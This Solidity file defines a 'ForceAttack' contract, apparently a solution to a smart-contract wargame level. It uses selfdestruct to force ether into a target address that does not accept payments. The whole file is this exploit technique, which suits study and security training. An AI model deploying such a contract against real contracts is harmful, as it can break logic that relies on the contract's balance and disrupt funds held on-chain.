// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

contract ForceAttack{
  function deposity() public payable{

  }

  function end (address _contract) public{
    selfdestruct(payable(address(_contract)));
  }
}


